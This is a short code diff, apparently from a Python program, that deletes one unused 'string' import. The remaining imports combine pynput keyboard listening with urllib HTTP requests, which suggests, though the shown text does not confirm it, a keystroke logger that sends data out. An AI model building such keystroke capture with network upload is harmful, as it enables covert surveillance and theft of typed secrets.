@@ -1,5 +1,4 @@
 import threading as thr
-import string
 from json import dumps
 from pynput.keyboard import Listener, Key
 from urllib.request import Request, urlopen
